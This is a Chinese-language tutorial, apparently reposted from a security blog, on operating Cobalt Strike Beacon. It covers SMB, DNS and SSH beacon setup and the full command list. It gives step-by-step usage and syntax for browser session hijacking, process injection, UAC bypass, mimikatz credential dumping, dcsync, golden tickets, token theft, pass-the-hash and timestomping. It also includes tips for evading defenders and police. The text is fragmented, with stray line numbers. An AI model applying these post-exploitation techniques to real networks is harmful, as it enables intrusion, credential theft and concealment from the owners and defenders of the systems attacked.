## Beacons的介绍

Beacon是Cobalt Strike为高级攻击者建模的Payload。使用Beacon通过HTTP，HTTPS
或DNS出口网络。而且Beacon非常灵活，支持异步和交互式通信。异步通信既低又慢。
Beacon将通讯本地，下载任务，然后进入睡眠状态。交互式通信实时发生。
Cobalt Strike能够将多个Beacons链接到一个链中。这些链接的Beacon接收它们的命
令，并通过其链中的父Beacon发送它们的输出。这种类型的链接对于控制哪些会话流出
网络以及模拟一个规范的演示是有用的，该演示将他们在网络内部的通信路径限制为合
理的。这种Beacons链接是Cobalt Strike中最强大的功能之一。我们也可以通过数据拓扑
图的方式在展示我们每台上线主机之间的关系和联系。

### 常用beacon隧道

#### 1.SMB Beacon

官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子
Beacon从父Beacon获取到任务并发送。
因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB
Beacon相对隐蔽，绕防火墙时可能发挥奇效。
这张图很好的诠释了SMB beacon的工作流程：

#### 2、SMB Beacon使用

这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。
在Listner生成SMB Beacon>目标主机>右键> spawn as>选中对应的Listener>
使用一个内网监听器
在这里为了方便，我直接上传马到内网目标机器中
生成马后上传的目标中去（这里为方便演示，这实战中具体如何看实际）
运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。
当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它。
这种Beacon在内网横向渗透中运用的很多

#### 3、DNS Beacon

DNS Beacon在绕过防火墙 权限维持上非常有效，DNS beacon可谓是最受欢迎的Cobalt Strike功能
之一。
官网给出的原理示意图如下：
使用DNS Beacon首先要有一个域名，域名建议用国外的，省去一些不必要的麻烦，也防止被查水
表。域名使用一些通用平常的即可，整个配置过程非常简单，一条A记录和几条NS记录即可。
首先进入到域名管理界面（自己的域名过期了，用一下404师傅的图）
配置A记录指向服务器ip -->ns记录都指向A记录域名
配置好了我们可以用nslookup或者dig +trace来测试下是否成功：
如果返回的IP地址与你的服务器IP地址对应是正确的，那我们就可以开始配置dns beacon的监听器
了。
Host那里最好填域名（A记录解析那个），不要填服务器的IP地址。
然后确定填上ns记录，英文逗号隔开，然后生成后门测试效果。
这是主机栏上出现了一个黑屏的logo，经过一段时间的等待，目标主机即可上线。

#### 4、SSH beacon

当内网有Linux时Cobalt Strike也是考虑到的提供了SSH连接，大家可以通过metasploit爆破内网的
SSH账号密码，然后用目标机的Beacon去连接就可以了。
目前有两种SSH Beacon连接方法：
①密码直接连接

Beacon命令: ssh [target:port] [user] [pass]

②SSH密匙连接

Beacon命令: ssh [target:port] [user] [pass]

连接成功后，如图就会出现一个子Beacon：

### Beacons的使用

右键目标主机，点击Interact即会进入我们的beacon。如图：



进入beacon模式之后，我们首先要修改CS默认的**心跳时间**（sleep）。一般情况下CS默
认的心跳时间为60s，即每一分钟目标主机与我们的Teamserver服务器进行交互。那这
样的话就会让我们执行操作的响应速度会变慢。如果实战中就建议不要太快，不然流量
会被很快发现。如果是实验，那我们一般都是设置为0或者1。
如图：
在Beacon中设置也行
如果我们要执行系统命令，就要使用shell+系统命令。而不能直接使用cmd命令等。如
图：
请注意，信标是异步有效负载。命令不会立即执行。每个命令进入队列。当Beacon签入（连接到
默认情况下，信标每60秒检查一次。您可以使用Beacons sleep命令更改此设置。使用sleep加
要每秒进行一次信标检查多次，请尝试sleep 0。这是交互模式。在这种模式下，命令将立即执行

也可以直接执行CS中自带的beacon命令 例如

Beacon Commands
===============
    Command                   Description
    -------                   -----------
    argue                     Spoof arguments for matching
processes
    blockdlls                 Block non-Microsoft DLLs in child
processes
    browserpivot              Setup a browser pivot session
    bypassuac                 Spawn a session in a high integrity
process
    cancel                    Cancel a download that's in￾progress
    cd                        Change directory
    checkin                   Call home and post data
    clear                     Clear beacon queue
    connect                   Connect to a Beacon peer over TCP
    covertvpn                 Deploy Covert VPN client
    cp                        Copy a file
    dcsync                    Extract a password hash from a DC
    desktop                   View and interact with target's
desktop
    dllinject                 Inject a Reflective DLL into a
process
    dllload                   Load DLL into a process with
LoadLibrary()
    download                  Download a file
    downloads                 Lists file downloads in progress
    drives                    List drives on target
    elevate                   Try to elevate privileges
    execute                   Execute a program on target (no
output)
    execute-assembly          Execute a local .NET program in-memory
on target
    exit                      Terminate the beacon session
    getprivs                  Enable system privileges on current
token
    getsystem                 Attempt to get SYSTEM
    getuid                    Get User ID
    hashdump                  Dump password hashes
    help                      Help menu
    inject                    Spawn a session in a specific
process
    jobkill                   Kill a long-running post￾exploitation task
    jobs                      List long-running post￾exploitation tasks
    kerberos_ccache_use       Apply kerberos ticket from cache to this
session
    kerberos_ticket_purge     Purge kerberos tickets from this session
    kerberos_ticket_use       Apply kerberos ticket to this session
    keylogger                 Inject a keystroke logger into a
process
    kill                      Kill a process
    link                      Connect to a Beacon peer over a
named pipe
    logonpasswords            Dump credentials and hashes with
mimikatz
    ls                        List files
    make_token                Create a token to pass credentials
    mimikatz                  Runs a mimikatz command
    mkdir                     Make a directory
    mode dns                  Use DNS A as data channel (DNS
beacon only)
    mode dns-txt              Use DNS TXT as data channel (DNS
beacon only)
    mode dns6                 Use DNS AAAA as data channel (DNS
beacon only)
    mode http                 Use HTTP as data channel
    mv                        Move a file
    net                       Network and host enumeration tool
    note                      Assign a note to this Beacon   

    portscan                  Scan a network for open services
    powerpick                 Execute a command via Unmanaged
PowerShell
    powershell                Execute a command via powershell.exe
    powershell-import         Import a powershell script
    ppid                      Set parent PID for spawned post-ex
jobs
    ps                        Show process list
    psexec                    Use a service to spawn a session on
a host
    psexec_psh                Use PowerShell to spawn a session on
a host
    psinject                  Execute PowerShell command in
specific process
    pth                       Pass-the-hash using Mimikatz
    pwd                       Print current directory
    reg                       Query the registry
    rev2self                  Revert to original token
    rm                        Remove a file or folder
    rportfwd                  Setup a reverse port forward
    run                       Execute a program on target
(returns output)
    runas                     Execute a program as another user
    runasadmin                Execute a program in a high-integrity
context
    runu                      Execute a program under another
PID
    screenshot                Take a screenshot
    setenv                    Set an environment variable
    shell                     Execute a command via cmd.exe
    shinject                  Inject shellcode into a process
    shspawn                   Spawn process and inject shellcode
into it
    sleep                     Set beacon sleep time
    socks                     Start SOCKS4a server to relay
traffic
    socks stop                Stop SOCKS4a server
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes
into
    spawnu                    Spawn a session under another PID
    ssh                       Use SSH to spawn an SSH session
on a host
    ssh-key                   Use SSH to spawn an SSH session on
a host
    steal_token               Steal access token from a process
    timestomp                 Apply timestamps from one file to
another
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file
    wdigest                   Dump plaintext credentials with
mimikatz
    winrm                     Use WinRM to spawn a session on a
host
    wmi                       Use WMI to spawn a session on a
host
Command                   Description
    -------                   -----------
    browserpivot              注入受害者浏览器进程
    bypassuac                 绕过UAC
    cancel                    取消正在进行的下载
    cd                        切换目录
    checkin                   强制让被控端回连一次
    clear                     清除beacon内部的任务队列
    connect                   Connect to a Beacon peer over TCP
    covertvpn                 部署Covert VPN客户端
    cp                        复制文件
    dcsync                    从DC中提取密码哈希
    desktop                   远程VNC
    dllinject                 反射DLL注入进程
    dllload                   使用LoadLibrary将DLL加载到进程中
    download                  下载文件
    downloads                 列出正在进行的文件下载
    drives                    列出目标盘符
    elevate                   尝试提权
    execute                   在目标上执行程序(无输出)
    execute-assembly          在目标上内存中执行本地.NET程序
    exit                      退出beacon
    getprivs                  Enable system privileges on current
token
    getsystem                 尝试获取SYSTEM权限
    getuid                    获取用户ID
    hashdump                  转储密码哈希值
    help                      帮助
    inject                    在特定进程中生成会话
    jobkill                   杀死一个后台任务
    jobs                      列出后台任务
    kerberos_ccache_use       从ccache文件中导入票据应用于此会话
    kerberos_ticket_purge     清除当前会话的票据
    kerberos_ticket_use       从ticket文件中导入票据应用于此会话
    keylogger                 键盘记录
    kill                      结束进程
    link                      Connect to a Beacon peer over a
named pipe
    logonpasswords            使用mimikatz转储凭据和哈希值
    ls                        列出文件
    make_token                创建令牌以传递凭据
    mimikatz                  运行mimikatz
    mkdir                     创建一个目录
    mode dns                  使用DNS A作为通信通道(仅限DNS
beacon)
    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)
    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS
beacon)
    mode http                 使用HTTP作为通信通道
    mv                        移动文件
    net                       net命令
    note                      备注       
    portscan                  进行端口扫描
    powerpick                 通过Unmanaged PowerShell执行命令
    powershell                通过powershell.exe执行命令
    powershell-import         导入powershell脚本
    ppid                      Set parent PID for spawned post-ex
jobs
    ps                        显示进程列表
    p**ec                    Use a service to spawn a session on
a host
    p**ec_psh                Use PowerShell to spawn a session on a
host
    psinject                  在特定进程中执行PowerShell命令
    pth                       使用Mimikatz进行传递哈希
    pwd                       当前目录位置
    reg                       Query the registry
    rev2self                  恢复原始令牌
    rm                        删除文件或文件夹
    rportfwd                  端口转发
    run                       在目标上执行程序(返回输出)
    runas                     以另一个用户权限执行程序
    runasadmin                在高权限下执行程序
    runu                      Execute a program under another
PID
    screenshot                屏幕截图
    setenv                    设置环境变量
    shell                     cmd执行命令
    shinject                  将shellcode注入进程
    shspawn                   生成进程并将shellcode注入其中
    sleep                     设置睡眠延迟时间
    socks                     启动SOCKS4代理
    socks stop                停止SOCKS4
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes
into
    spawnu                    Spawn a session under another PID
    ssh                       使用ssh连接远程主机
    ssh-key                   使用密钥连接远程主机
    steal_token               从进程中窃取令牌
    timestomp                 将一个文件时间戳应用到另一个文件
    unlink                    Disconnect from parent Beacon
    upload                    上传文件
    wdigest                   使用mimikatz转储明文凭据
    winrm                     使用WinRM在主机上生成会话
    wmi                       使用WMI在主机上生成会话
    argue                      进程参数欺骗
一些例子
1.Browserpivot
注入受害者浏览器进程，然后开启HTTP代理
我们先使用ps / tasklist 找到浏览器的进程id值
注入进程：
注入浏览器进程成功之后，会显示： Browser Pivot HTTP proxy is at: xxx.xxx.xxx.xxx:端
口号
1 beacon> browserpivot 1580
然后就可以设置本地HTTP浏览器代理
然当被攻击者关闭浏览器的时候，代理也就失效了，关闭此代理可使用如下命令：
browserpivot stop
此功能我们可以利用受到威胁的用户的浏览会话。
这种攻击的工作方式：
受害者使用Internet Explorer登录到某些Web应用程序。
攻击者/操作者通过发出命令来创建浏览器枢轴browserpivot
信标通过绑定和侦听端口（例如说6605），在受害系统上创建代理服务器（更精确
地说，在Internet Explorer进程中）。
团队服务器绑定并开始侦听端口，例如33912
攻击者现在可以使用他们的teamserver：33912作为Web代理。通过此代理的所有流
量都将通过Internet Explorer进程（端口6605）转发/遍历在受害者系统上打开的
代理。由于Internet Explorer依赖WinINet库来管理Web请求和身份验证，因此将对
攻击者的Web请求进行重新身份验证，从而使攻击者可以查看受害者具有活动会话的
相同应用程序，而无需要求登录。
利用手法;
1 browserpivot 244 x86
左侧-受害系统已登录到某个应用程序，右侧-攻击者ID试图访问同一应用程序，并由于未
通过身份验证而显示登录屏幕：
如果攻击者开始通过受害者代理来代理其网络流量，则情况将发生变化：10.0.0.5:33912
2.powershell-import
导入各种powershell渗透框架，直接执行：
或者直接执行：
要执行某模块直接使用如下命令,比如
3.kerberos
共有三个模块
也就是域中常用的手段 普通票据、金银票据传递攻击
使用mimikatz:
beacon> powershell-import
powershell-import [/path/to/local/script.ps1]
beacon> powershell xxx-xxx
kerberos_ccache_use 从cache文件中导入票据
kerberos_ticket_purge 清除当前会话的票据
kerberos_ticket_use 从ticket文件中导入票据
1
1
1
1
2
3
4.在没有powershell.exe的情况下使用powershell
使用powerpick命令可在没有powershell.exe的情况下执行PowerShell 命令
该命令将注入非托管的PowerShell为特定的过程，并从该位置运行的cmdlet
5.在没有CMD.exe的情况下使用CMD命令
使用run命令执行不带cmd.exe的命令。运行命令将输出输出给您。在执行命令在后台运
行的程序并不能捕获输出。
1 kerberos::golden /admin:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FIL
6.更改shell的路径
如果希望Beacon从特定目录执行命令，可以在Beacon控制台中使用cd命令来切换
Beacon进程的工作目录。使用pwd命令获取shell的目录。
然后使用cd命令就可以切换了，SETENV命令将设置环境变量。
7.进程注入
进程注入我们这里演示二种方法
分别是 inject命令和spawnto命令
默认情况下，cs在rundll32.exe中产生一个会话。运维管理员可能会发现rundll32.exe定
期与Internet建立连接很奇怪。使用查找一个更好的程序（例如Internet Explorer），然后
注入到它的进程中去，可以有效隐藏会话
1.使用spawn命令
使用ps命令列出进程
使用spawnt命令注入到某一进程中
设置监听器
1 spawn [x86/x68] [进程名字/路径] 
注入成功会返回一个新的会话
2.使用inject，后面接进程ID和侦听器名称，以将会话注入到特定进程中。
1.使用ps获取当前系统上的进程列表。
2.使用inject [pid] x64将64位信标注入到x64进程中。也可以注入x86中
3.设置监听器
4.注入成功，返回一个新的shell
一个利用手法：
受害系统上的任何进程下执行Powershell脚本。
1 psinject 【pid】[ ps1]
绿色突出显示的是在注入powershell脚本时在目标进程中打开的新句柄：
spawn和inject命令都将有效载荷阶段注入到内存中。如果有效负载阶段是HTTP，
HTTPS或DNS信标，并且它无法到达CS-我们将看不到会话。如果有效负载阶段是绑定
TCP或SMB信标，则这些命令将自动尝试链接并承担对这些有效负载的控制。
8.Runu允许我们从指定的父进程启动新进程：
8.Upload and Download Files
下载download
runu [pid] 新进程
download [目标文件目录]
1
1
信标是为低速和慢速数据泄露而构建的。在每次签入过程中，Beacon会下载任务指定要
获取的每个文件的固定块。该块的大小取决于信标的当前数据通道。HTTP和HTTPS通
道以512KB的块形式提取数据。
转到查看-> Cobalt Strike中的下载，以查看您的团队到目前为止已下载的文件。此选项
卡中仅显示完成的下载。下载的文件存储在团队服务器上。要将文件带回系统，请在此
处突出显示它们，然后按Sync Files。然后，Cobalt Strike将选择的文件下载到系统上您
选择的文件夹中。
上传文件upload
1 upload [/path/to/file]
上传文件时，有时会需要更新其时间戳，以使其与同一文件夹中的其他文件融合。
可以使用timestomp命令执行此操作。
timestomp命令会将一个文件的“修改”，“访问”和“创建”时间与另一个文件进行匹配。
9.文件系统命令
使用ls命令列出当前目录中的文件。使用mkdir创建目录。rm将删除文件或文件夹。cp将
文件复制到目标位置。mv移动文件。
10.反向枢轴
端口停止【绑定端口】
在目标主机上绑定指定的端口。当连接进来时，CobaltStrike将连接到转发的主机/端口并
使用Beacon在两个连接之间中继通信。
使用rportfwd stop [bind port]禁用反向端口转发。
11.生成和隧道
使用spunnel命令可在临时过程中生成第三方工具，并为其创建反向端口。
该命令期望代理文件是与位置无关的shellcode（通常是来自另一个攻击平台的原始输
出）。该spunnel_local命令是一样的spunnel，除了它开始从你的cs客户端控制器连接。
timestomp [fileA] [fileB]
使用：rportfwd [绑定端口] [转发主机] [转发端口]
语法为spunnel [x86或x64] [controller host] [controller port] [/path/to/agent.
1
1
1
通过Cobalt Strike客户端与其团队服务器之间的连接来通信spunnel_local通信。
12.特权提升
利用漏洞提升
输入elevate命令以列出在Cobalt Strike中注册的特权升级漏洞。
成功之后会反弹新的会话回来
单独使用runasadmin命令可以列出在Cobalt Strike中的漏洞。
1 运行elevate [exploit] [listener]尝试提升特定的利用。
运行runasadmin [exploit] [command + args]尝试bypassUac提权。
使用已知凭证提升
使用runas [DOMAIN \ user] [password] [command]以其他用户的身份运行命令。
runas命令将不返回任何输出。
这里给个手法：可以使用poweshell 远程执行上线
使用spawnas [DOMAIN \ user] [password] [listener]使用其凭据以另一个用户的身份生成
会话。此命令产生一个临时进程，并将我们的有效负载阶段注入进程中。
也可以转到[beacon]-> Access-> Spawn As也运行此命令。
使用命令
使用getsystem模拟SYSTEM帐户的令牌。这种访问权限级别可以让我们执行特权操作，
而这些操作是管理员用户无法执行的。
具体成功与否看实际环境
获取SYSTEM的另一种方法是创建运行有效负载的服务。
它将删除运行有效负载的可执行文件，创建服务以运行它，承担对有效负载的控制，并
清理服务和可执行文件。
13.UAC绕过
Microsoft在Windows Vista中引入了用户帐户控制（UAC）并在Windows 7中对其进行了
改进。UAC的工作原理与UNIX中的sudo相似。用户每天都以普通特权工作。当用户需要
执行特权操作时，系统会询问他们是否要提升其权限。
Cobalt Strike附带了两次UAC旁路攻击。
ELEVATE SVC-EXE [监听]
elevate uac-token-duplication [listener]
runasadmin uac-token-duplication [command] runasadmin uac-cmstplua [comman
1
1
2
elevate uac-token-duplication [listener]
将产生一个权限提升的临时进程，并向其中注入有效负载阶段。此攻击使用
UAC漏洞，该漏洞允许未提升的进程使用从提升的进程窃取的令牌启动任意
进程。此漏洞需要攻击才能删除分配给提升令牌的多个权限。新会话的功能
将反映这些受限制的权利。如果始终通知处于最高设置，则此攻击要求当前
桌面会话中已经以同一用户身份运行了提升的进程。
此攻击适用于2018年11月更新之前的Windows 7和Windows 10。
要检查当前用户是否在Administrators组中，请使用shell whoami / groups。
使用elevate uac-token-duplication msf1
返回一个新的会话
如果不在Administrators组中
目标机器弹出UAC，无法利用
runasadmin uac-token-duplication [command] /runasadmin uac-cmstplua
[command] 
与上述攻击相同，但是此利用成功不会返回一个新的会话而是在提升的环境中运行我们
要选择的命令。
利用条件也是和前面一样
如果不在Administrators组中
14.getprivs
每个系统都有一个帐户数据库，用于存储用户帐户和组帐户所拥有的特权。当用户登录
时，系统会生成一个访问令牌，其中包含用户特权的列表，包括授予用户或用户所属组
的特权。请注意，特权仅适用于本地计算机。域帐户在不同的计算机上可以具有不同的
特权。
当用户尝试执行特权操作时，系统检查用户的访问令牌以确定该用户是否拥有必要的特
权，如果是，则检查是否启用了特权。如果用户未通过这些测试，则系统不会执行该操
作。
在CS种可以使用getprivs来确定访问令牌是否持有指定的特权集。
关于Privileges的攻击方法，本文不多描述，有兴趣的可以查看我的另一篇文章。
15.凭据导出
凭据说的通俗易懂一点，可以理解为目标机的账号，密码
凭据导出是渗透测试中即为重要的步骤，导出目标机凭据后，我们可以使用凭据实现横
向移动（利用hash传递，smb/rdp爆破等等手法）来扩大我们的战果
windows通常使用两种方法对用户的密码进行加密，在域环境中，用户信息加密成散列值
后存在ntds.dit中。
windows密码组成：
windows hash 结构：
注意：
LM hash （DES加密），NTLM hash （MD4）具体手法看实战环境
username：RID：lm-hash：nt-hash
1
1
从windows vita 和windows server 2008 开始 windows就默认禁用LM-hash了（重点：这
里是禁用 不是弃用）改用NTLM hash认证了
LM-hash明文密码限在14位（安全性不高）
还有一点：如果禁用LM-hash了，那么我们只能捉到aad3b435b51404eeaad51404ee。
当然也可能是LM-hash为空值。
如果目标关闭了Wdigest功能/安装了补丁kb2871997的话是无法从内存中dump明文密码
的。Windows server 2012以上默认关闭Wdigest功能。
条件：权限一定得是system权限
原理：本地的用户名，散列值和其它安全信息都存在
SAM（c:\windows\system32\config）文件中，lsass.exe进程用于实现Windows的安全策
略（本地和登录策略），那么我们可以使用工具把散列值和明文密码从内存中的
lsass.exe进程/SAM文件中导出
Hashdump导出hash
选择beacon会话右键,选择执行–>转储Hash，或在beacon中输入hashdump
如图beacon会话框输出了目标机的用户名和密码hash值
以本次导出的一个凭据为例
f4bb18c1165a89248f9e853b269a8995为admin用户的NTLM Hash
我们可以去cmd5等平台破解该NTLM密文，如图，破解后明文为Abc123
Mimikatz导出凭据
选择执行–>Run Mimikatz，或在beacon中执行logonpasswords命令当会话为管理员权限
时，才能dump成功，如果权限很低，请先提权，然后在实战中使用要进行免杀处理。
1 admin:1022:aad3b435b51404eeaad3b435b51404ee:f4bb18c1165a89248f9e853b269a8995:
也可以在beacon中输入命令
使用dcsync [DOMAIN.FQDN]从域控制器提取所有帐户的密码哈希。
此技术使用Windows API来在域控制器之间同步信息。它需要域管理员信任关系。
CS中使用mimikatz来执行此技术。
使用条件：administrator用户权限
例如：在administrator权限中使用
在system权限中
如果要特定的密码哈希，请使用 dcsync [DOMAIN.FQDN] [DOMAIN \ user]。
例如：我们拿mssql的
16.端口扫描
cs具有内置的端口扫描程序。
可以指定目标范围的逗号分隔列表。端口也是如此。例如，端口扫描172.16.48.0/24 1-
1024,8080将扫描端口1至1024和8080上的主机172.16.48.0至172.16.48.255。
有三个目标发现选项。
使用portscan [目标] [端口] [发现方法]启动端口扫描程序作业。
arp方法使用ARP请求来发现主机是否还活着。
1
1
2
端口扫描器将在beacon之间运行。当有要报告的结果时，它将把它们发送到控制台。
Cobalt Strike将处理此信息，并使用发现的主机更新目标。
注意：扫描的不同方法有不同的动作（流量），扫描可能会让蓝方检测并发现我们。使
用之前应该注意。可以在晚上进行扫描。
例如：
icmp方法发送ICMP回显请求，以检查目标是否存在。
none选项告诉portscan工具假定所有主机均处于活动状态。
3
4
5
17.网络和主机枚举
信标网络模块提供了在Windows活动目录网络中查询和发现目标的工具。
net命令。我们可以使用help net 命令看看
信标的主机和网络枚举工具。内置的net命令包括：
1 语法：net [command 命令] [arguments/叁数]
使用net dclist命令查找目标加入到的域的域控制器。
Command Description 
------- ---------- ------ -----------
 computers lists hosts in a domain (groups) 
 domain display domain for this host 
 dclist lists domain controllers 
 domain_controllers lists DCs in a domain (groups) 
 domain_trusts lists domain trusts 
 group lists groups and users in groups 
 localgroup lists local groups and users in local groups 
 logons lists users logged onto a host 
 sessions lists sessions on a host 
 share lists shares on a host 
 user lists users and user information 
 time show time for a host 
 view lists hosts in a domain (browser service) 
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
使用net view命令在目标加入的域中查找目标。
这两个命令也将填充目标模型。
该命令通过在域控制器上查询计算机帐户组找到目标。
cs的net模块包含在Windows网络枚举API之上构建的命令。这些命令是Windows中许多
内置net命令的直接替代。
这里也有一些独特的功能，当我们必须查找谁是另一个系统上的本地管理员时，这些命
令在横向移动期间非常有用。
例如，
使用net localgroup \\ 主机 列出另一个系统上的组。
使用net localgroup \\ 主机 组名 可以列出另一个系统上组的成员。
1
1
18.信任关系
当用户登录Windows主机时，将生成访问令牌。该令牌包含有关用户及其权限的信息。
访问令牌还保存将用户认证到同一Active Directory域上的另一个系统所需的信息。我们
可以从其他进程中窃取令牌并将其应用于我们的信标。执行此操作时，那么我们就可以
与该用户在域上的其他系统进行交互。
使用steal_token可以模拟现有进程中的令牌。
利用手法：
ps列出当前进程列表
我们来看看利用pid 1712 的吧 这是360哈哈哈哈
1 语法：steal_token [pid]
如果我们知道用户的凭据；使用make_token生成传递这些凭据的令牌。该令牌是我们当
前令牌的副本，带有已修改的单点登录信息。它将显示您当前的用户名。
账号密码可以使用mimikatz dump。
使用mimikatz与Beacon进行哈希混合。命令pth将创建并模拟访问令牌以传递指定的哈
希。
语法： make_token [DOMAIN\user] [password]
语法：pth [DOMAIN\user] [NTLM hash]
getuid命令将打印您当前的令牌。
使用rev2self还原为原始令牌。
1
1
1
2

Kerberos票证
尝试使用mimikatz 2.0生成的金票。
使用将Kerberos票证注入当前会话。
这将使Beacon可以使用该票证中的权限与远程系统进行交互。
使用kerberos_ticket_purge清除与我们的会话关联的任何kerberos凭单
19.其他命令
信标还有其他一些上面没有提到的命令。
在明确的命令将清除灯塔的任务列表。如果输入有误，请使用它。
输入exit要求Beacon退出。
使用kill [pid]终止进程。
使用timestomp可以将一个文件的“修改”，“访问”和“创建”时间与另一个文件的“修改”，“访
问”和“创建”时间进行匹配。
by：李木
微信公众号黑白天实验室
1 语法：kerberos_ticket_use [/ path / to / ticket]